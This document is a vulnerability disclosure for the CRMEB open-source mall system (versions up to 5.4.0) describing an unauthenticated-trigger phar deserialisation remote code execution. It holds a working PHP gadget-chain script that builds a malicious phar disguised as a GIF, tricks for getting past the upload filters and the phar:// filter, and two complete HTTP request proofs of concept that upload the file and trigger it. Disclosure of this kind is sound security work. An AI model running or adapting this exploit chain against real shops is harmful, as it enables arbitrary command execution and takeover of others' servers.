BUG_Author:

Rui Jie

Affected version:

Version<=5.4.0

Vendor:
https://www.crmeb.com/

CRMEB open source mall system

Software:
https://gitee.com/ZhongBangKeJi/CRMEB

https://github.com/crmeb/CRMEB


Vulnerability File:

app/api/controller/v1/PublicController.php

app/common.php

Description:
 A vulnerability categorised as critical has been identified in CRMEB. This affects the put_image section of the file common.php. Manipulation of the image/code parameter results in phar deserialisation enabling the RCE
 
 It's a complicated process.
 
 This system is based on thinkphp6 again, I can get the available deserialisation chain through code audit
 
```php
 <?php  
  
namespace think\model\concern;  
  
trait Attribute  
{  
    private $data = ["evil_key" => "calc"];  
    private $withAttr = ["evil_key" => "system"];  
}  
  
namespace think;  
  
abstract class Model  
{  
    use model\concern\Attribute;  
    private $lazySave;  
    protected $withEvent;  
    private $exists;  
    private $force;  
    protected $table;  
    function __construct($obj = '')  
    {  
        $this->lazySave = true;  
        $this->withEvent = false;  
        $this->exists = true;  
        $this->force = true;  
        $this->table = $obj;  
    }  
}  
namespace app\model\product\product;  
  
use crmeb\traits\ModelTrait;  
use think\Model;  
  
  
class StoreProductCate extends Model  
{  
}  
  
$a = new StoreProductCate();  
$b = new StoreProductCate($a);  
echo urlencode(serialize($b));  
$phar = new \Phar('x.phar');  
$phar->stopBuffering();  
$phar->setStub( 'GIF89a'.'<?php __HALT_COMPILER();?>');  
$phar->addFromString('test.phar', 'test');  
$phar->setMetadata($b);  
$phar->stopBuffering();
```
This generates a phar file containing the available serialisations, I try to pop up the calculator locally
After any user has logged in, we can try to upload this file as an avatar, but there are some filters here

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407122332062.png)
Both the suffix and the file content are restricted here
We can try to gzip the phar file to bypass the content detection, modify the extension to .jpg renamed 123.jpg

I'll put 123.jpg here
![123.jpg](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407130004529.jpg)

POC1

Note that here I'm using yakit's tags directly to read the contents of the local file 123.jpg before uploading it

```POST /api/upload/image HTTP/1.1
Host: 127.0.0.21
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3eJTGWU51qa6ag3o
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Sec-Fetch-Dest: empty
Referer: http://127.0.0.21/pages/users/user_info/index
Origin: http://127.0.0.21
Accept-Encoding: gzip, deflate, br, zstd
Cookie: cb_lang=zh-cn; PHPSESSID=84e2385486352b76586e45157fd93cda; WS_ADMIN_URL=ws://127.0.0.21/notice; WS_CHAT_URL=ws://127.0.0.21/msg; XDEBUG_SESSION=11675
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
Sec-Fetch-Mode: cors
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIsImlzcyI6IjEyNy4wLjAuMjEiLCJhdWQiOiIxMjcuMC4wLjIxIiwiaWF0IjoxNzIwNzc0NDU2LCJuYmYiOjE3MjA3NzQ0NTYsImV4cCI6MTcyMzM2NjQ1NiwianRpIjp7ImlkIjoxLCJ0eXBlIjoiYXBpIn19.LeWiJQ-aB4EqFsXuWEur2iNuybXLyLzusTepZC896Gg
Sec-Fetch-Site: same-origin
Content-Length: 1437

------WebKitFormBoundary3eJTGWU51qa6ag3o
Content-Disposition: form-data; name="filename"

pics
------WebKitFormBoundary3eJTGWU51qa6ag3o
Content-Disposition: form-data; name="pics"; filename="123.jpg"
Content-Type: image/jpeg

{{file(D:\\123.jpg)}}
------WebKitFormBoundary3eJTGWU51qa6ag3o--

```
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407130007396.png)


You can get the location of the uploaded image
For example, here it is `http://127.0.0.21/uploads/store/comment/20240713/9bcb28a14962bb8fb64b0652d2212ef4.jpg`
Now we can trigger it with the  `put_image` method in app/common.php(This is an unauthorised interface)
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407122345869.png)
There is a filter on phar://, which we can bypass with Phar://.
The readfile function will trigger the phar deserialisation implementation rce
POC2
```
POST /api/image_base64 HTTP/1.1
Host: 127.0.0.21
Cookie: cb_lang=zh-cn; PHPSESSID=c3db7bedde04b37c0bc6a5699dbde774
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Referer: http://crmeb.cc//api/image_base64
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cache-Control: max-age=0
Content-Length: 53

{"image":"Phar://./uploads/store/comment/20240713/9bcb28a14962bb8fb64b0652d2212ef4.jpg","code":""}
```
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407122354438.png)

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407130009247.png)

However, it should be noted that it uses the CacheService::remember method to try to get the Base64 encoding of the $imageUrl from the cache, which should be changed after the first execution

This means you may need to upload once, trigger once.

Now we can execute any command to implement RCE！
